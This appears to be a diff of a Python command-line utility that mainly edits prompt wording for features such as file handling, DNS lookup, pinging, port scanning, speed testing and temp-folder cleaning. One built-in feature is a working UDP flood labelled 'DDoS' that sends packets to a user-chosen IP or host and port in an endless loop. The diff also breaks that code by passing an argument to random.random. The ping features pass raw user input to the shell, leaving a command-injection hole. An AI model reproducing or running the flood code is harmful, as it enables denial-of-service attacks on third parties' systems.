@@ -95,9 +95,9 @@ This software is licensed to {getpass.getuser()}.
 
             import os
             a = input("Enter file name: ")
-            b = input("Enter Extension: ")
+            b = input("Enter extension: ")
             if os.path.isfile(a+b):
-                print(f"{a+b} <-- File Exists")
+                print(f"{a+b} <-- File exists")
             else:
                 newf = open(str(a)+str(b), 'w')
                 print(
@@ -117,7 +117,7 @@ This software is licensed to {getpass.getuser()}.
                 askdelfile = input(
                     "Do you want to delete this console from your pc?")
                 if askdelfile == "yes":
-                    print("ok. removing..")
+                    print("Ok. Removing..")
                     os.remove(myfile)
                 else:
                     pass
@@ -136,41 +136,41 @@ This software is licensed to {getpass.getuser()}.
                 usrinp = input("Enter Text: ")
                 k.write(usrinp+"\n")
                 k.close()
-                print(f"The File named {User3} is updated successfully!")
+                print(f"The file named {User3} is updated successfully!")
             except:
-                print(f"{User3} <-- File Not found!")
+                print(f"{User3} <-- File not found!")
         # Rename a file
         elif z == "rename.file":
             try:
                 import os
 
                 oldfilename1 = input("Enter old file name: ")
-                oldextensionname = input("Enter Old File Exetension: ")
-                newfilename1 = input("Enter New File Name: ")
-                newextensionname = input("Enter New Extension Name: ")
+                oldextensionname = input("Enter old file extension: ")
+                newfilename1 = input("Enter new file name: ")
+                newextensionname = input("Enter new file extension: ")
                 os.rename(oldfilename1+oldextensionname,
                           newfilename1+newextensionname)
                 print(
                     f"The file named {oldfilename1+oldextensionname} has been successfully updated to {newfilename1+newextensionname}!")
             except:
-                print(f"{oldfilename1}{oldextensionname} <-- File Not Found!")
+                print(f"{oldfilename1}{oldextensionname} <-- File not found!")
 
         # get ip from host
         elif z == "host.getip":
             try:
                 import socket
-                askhost = input("Enter Host URL: ")
+                askhost = input("Enter host URL: ")
                 convert_host = socket.gethostbyname(askhost)
-                print(f"The ip address of Host: {askhost} is {convert_host}")
+                print(f"The IP-address of host: {askhost} is {convert_host}")
             except:
-                print(f"{askhost} host ip address not found")
+                print(f"{askhost} host IP-address not found")
         # get host name from ip
         elif z == "ip.get":
             try:
                 import socket
-                askusrforip = input("Enter Host IP : ")
+                askusrforip = input("Enter host IP : ")
                 hostipcheck = socket.gethostbyaddr(askusrforip)
-                print(f"The Host of this Ip is {hostipcheck}")
+                print(f"The host of this Ip is {hostipcheck}")
             except socket.gaierror:
                 print("Unknown error")
             except:
@@ -186,7 +186,7 @@ This software is licensed to {getpass.getuser()}.
 
         # Gb to Mb convertor
         elif z == "gb.mb":
-            user = int(input("Enter Number in GB : "))
+            user = int(input("Enter number in GB: "))
             if user == "1":
                 print("1024")
             else:
@@ -195,29 +195,29 @@ This software is licensed to {getpass.getuser()}.
 
         # Mb to Gb Convertor:
         elif z == "mb.gb":
-            valmb = int(input("Enter Number in MB : "))
+            valmb = int(input("Enter number in MB: "))
             cf = valmb*0.0009765625
             print(cf)
 
         # For opening url in the browser
         elif z == "net.browse":
             import webbrowser
-            thUser = input("Enter Web Url :")
+            thUser = input("Enter website URL:")
             webbrowser.open(thUser)
-            print(f"Opening {thUser} in Browser.")
+            print(f"Opening {thUser} in browser.")
         # Pinging Websites
         elif z == "lan.ping":
             from os import system
-            Enterurl = input("Enter URL :")
+            Enterurl = input("Enter URL:")
             system("ping " + Enterurl)
 
         # Ping Constantly
         elif z == "ping.t":
-            s2e4 = input("Do you want to Ping Websites :")
-            if s2e4 == "y":
+            s2e4 = input("Do you want to ping websites?")
+            if s2e4 == "yes":
                 try:
                     import subprocess
-                    askusrtouser = input("Enter Website url : ")
+                    askusrtouser = input("Enter website URL: ")
                     prpc342 = subprocess.check_output(
                         "ping "+askusrtouser+" -t").decode('utf-8')
                     print(prpc342)
@@ -238,17 +238,17 @@ This software is licensed to {getpass.getuser()}.
             open_ports = []
             while True:
                 ip_add_entered = input(
-                    "Please enter the ip address that you want to scan: ")
+                    "Please enter the IP-address that you want to scan:")
                 try:
                     ip_address_obj = ipaddress.ip_address(ip_add_entered)
-                    print("You entered a valid ip address.")
+                    print("You entered a valid IP-address.")
                     break
                 except:
-                    print("You entered an invalid ip address")
+                    print("You entered an invalid IP-address")
             while True:
                 print(
-                    "Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
-                port_range = input("Enter port range: ")
+                    "Please enter the range of ports you want to scan in format: <int>-<int> (ex. would be 60-120)")
+                port_range = input("Enter port range:")
                 port_range_valid = port_range_pattern.search(
                     port_range.replace(" ", ""))
                 if port_range_valid:
@@ -273,30 +273,30 @@ This software is licensed to {getpass.getuser()}.
         elif z == "net.speedtest":
             import speedtest
 
-            notification_c("Testing Your Network Speed")
+            notification_c("Testing your network speed.")
             def getNetSpeed():
                 import speedtest
                 tester = speedtest.Speedtest()
-                print("Searching For The Best Server...")
+                print("Searching for the best server...")
                 # Check for the best servers
                 bestServer = tester.get_best_server()
                 print(
                     f'Selecting {bestServer["host"]} located in {bestServer["country"]},{bestServer["name"]}')
                 # Now code for Checking Downloading Speed.
-                print("Checking Downloading Speed...")
+                print("Checking downloading speed...")
                 downloadSpeed = tester.download()
                 print("Done!")
                 # Now code for checking Uploading Speed.
-                print("Checking Uploading Speed...")
+                print("Checking uploading speed...")
                 uploadSpeed = tester.upload()
                 print("Done!")
                 ping = tester.results.ping
-                print('Results :')
+                print('Results:')
                 print(
                     f'-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s')
                 print(f'-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s')
                 print(f'-Ping : {ping :.2f} ms')
-                notification_c(f"""Here are SpeedTest Results
+                notification_c(f"""Here are SpeedTest results
 -Download speed : {downloadSpeed/1048576 :.2f} Mbits/s
 -Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s
 -Ping : {ping :.2f} ms""")
@@ -328,22 +328,22 @@ This software is licensed to {getpass.getuser()}.
 
             ##############
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bytes = random._urandom(1490)
+            bytes = random.random(1490)
             #############
             bdafa = input("""Select one
-[A] DDoS using an ip address (if you already have an ip address)
-[B] DDoS using host (if you dont have an ip address)
+[A] DDoS using an IP-address (if you already have an IP-address)
+[B] DDoS using host (if you don't have an IP-address)
 
 """)
             if bdafa == "A":
 
                 try:
-                    ip = input("Enter Ip address: ")
+                    ip = input("Enter IP-address: ")
 
                     try:
-                        port = int(input("Port       : "))
+                        port = int(input("Port: "))
                     except:
-                        print("Dont use strings in port!")
+                        print("Don't use strings in port!")
 
                     print(f"Starting an DDoS Attack on {ip}")
                     print("[                    ] 0% ")
@@ -368,18 +368,18 @@ This software is licensed to {getpass.getuser()}.
                             port = 1
 
                 except KeyboardInterrupt as exception:
-                    KeyboardInterrupt == print("\nok") , notification_c(f"The DDoS Attact on {ip} and port {port} has been stopped due to keyboard interupt")
+                    KeyboardInterrupt == print("\nok") , notification_c(f"The DDoS Attack on {ip} and port {port} has been stopped due to keyboard interupt")
                 except socket.gaierror as axs:
-                    socket.gaierror == print(f"{ip} <-- Wrong Ip address")
+                    socket.gaierror == print(f"{ip} <-- Wrong IP-address")
 
             else:
                 try:
-                    user13232 = input("Enter Host : ")
+                    user13232 = input("Enter host : ")
                     ip2 = socket.gethostbyname(user13232)
                     port2 = int(input("Port       : "))
                     print(
-                        f"Starting an DDoS Attack on Host {user13232} ip address is {ip2}:")
-                    notification_c(f"Started DDoS Attack at {user13232} ip address is {ip2}")
+                        f"Starting an DDoS Attack on host {user13232} IP-address is {ip2}:")
+                    notification_c(f"Started DDoS Attack at {user13232} IP-address is {ip2}")
                     sent = 0
                     while True:
                         sock.sendto(bytes, (ip2, port2))
@@ -393,7 +393,7 @@ This software is licensed to {getpass.getuser()}.
                     KeyboardInterrupt == print("\nProcess Stopped - REASON : KeyBoard Interrupt") , notification_c(f"The DDoS Attact on {user13232} with the ip address of {ip2} has been stopped due to keyboard interupt")
                 except socket.gaierror:
                     socket.gaierror == print(
-                        f"{user13232} <-- Host Not Found + No ip address Found ")
+                        f"{user13232} <-- Host not found + no IP-address found. ")
 
         # app updater
         elif z == "update.commandline":
@@ -403,7 +403,7 @@ This software is licensed to {getpass.getuser()}.
         elif z == "git.clone":
             from git import Repo
             import os
-            ask_abt_dir = input("Enter the Location(not gitlink): ")
+            ask_abt_dir = input("Enter the location(no gitlink): ")
             ask_abt_url = input("Enter repository link(git link): ")
             ask_folder_name = input(
                 "Enter the folder name(new folder to store files): ")
@@ -429,12 +429,12 @@ This software is licensed to {getpass.getuser()}.
             if option == "a":
                 # if the user selects option a, the program will scan and fix the broken files.
                 try:
-                    notification_c("The Auto Scan Fix is Started.")
+                    notification_c("The Auto Scan Fix is started.")
                     sleep(2)
                     print(f"{Fore.RED} This process could take some time.")
                     # sfc/scannow is the command that scans and fix the files automatically.
                     os.system("sfc/scannow")
-                    notification_c("The System Scan and Fix is Completed")
+                    notification_c("The system scan and fix is completed!")
                 # if the user presses ctrl+c, the program will ask for stopping the process.
                 except KeyboardInterrupt:
                     ask_stop_scan = input(
@@ -450,17 +450,17 @@ This software is licensed to {getpass.getuser()}.
                 sleep(1)
                 print(f"{Fore.BLUE}Checking Temp folders...")
                 sleep(1)
-                print(f"{Fore.BLUE}Cleaning c:\windows\\temp...")
+                print(f"{Fore.BLUE}Cleaning C:\\Windows\\temp...")
                 try:
                     # the directory that will be deleted.
-                    del_dir = r'c:\windows\temp'
+                    del_dir = r'C:\Windows\temp'
                     # this deletes the directory with ignored errors.
                     shutil.rmtree(del_dir, ignore_errors=True)
                 except:
-                    print(f"{Fore.RED}Unknown Error was Found!")
-                print(f"{Fore.RED}Cleaning Completed!")
+                    print(f"{Fore.RED}Unknown error was found!")
+                print(f"{Fore.RED}Cleaning completed!")
                 sleep(1)
-                print(f"{Fore.BLUE}Cleaning c:\\AppData\\Local\Temp...")
+                print(f"{Fore.BLUE}Cleaning C:\\AppData\\Local\\Temp...")
                 try:
                     getusr = getpass.getuser()  # this will get the current user
                     # directory that will be deleted.
@@ -468,8 +468,8 @@ This software is licensed to {getpass.getuser()}.
                     # this will delete the directory with ignored errors.
                     shutil.rmtree(del_app_cache, ignore_errors=True)
                 except:
-                    print(f"{Fore.RED}Unknown Error was Found!")
-                print(f"{Fore.RED}Cleaning Completed!")
+                    print(f"{Fore.RED}Unknown error was found!")
+                print(f"{Fore.RED}Cleaning completed!")
                 notification_c("The Temp folders are cleaned now!")
                 usr_ask_log = input(
                     "Do you want to save a log of the cleaning?[y/n]: ")
@@ -479,7 +479,7 @@ This software is licensed to {getpass.getuser()}.
                         with open("logs.txt", "a") as f:
                             import datetime
                             f.write(
-                                "Logs Created by scanfix kit - CommandLine\n")
+                                "Logs created by ScanFix kit - CommandLine\n")
                             f.write("==========================\n")
                             f.write(
                                 f"The date of creation : {datetime.datetime.now()}\n")
@@ -489,7 +489,7 @@ This software is licensed to {getpass.getuser()}.
                             f.close()
                             with open("logs.txt", "a") as f:
                                 # basically with the help of this code, the program will write the files that are not deleted in the Temp folders.
-                                # both temp folder and the AppData\\Local\\Temp folder. will be written in the log file.
+                                # both temp folder and the AppData\Local\Temp folder will be written in the log file.
                                 files_get = os.listdir(
                                     r'c:\Users\%s\AppData\Local\Temp' % getusr)
                                 f.close()
@@ -505,7 +505,7 @@ This software is licensed to {getpass.getuser()}.
                                 f.close()
                                 notification_c("The Logs has been saved at the current Directory")
                             f = open("logs.txt", "a")
-                            f.writelines('Files in c:\windows\\temp\n')
+                            f.writelines('Files in C:\\windows\\temp\n')
                             with open("logs.txt", "a") as f:
                                 files_get1 = os.listdir(r'c:\\windows\\temp\\')
                                 f.close()
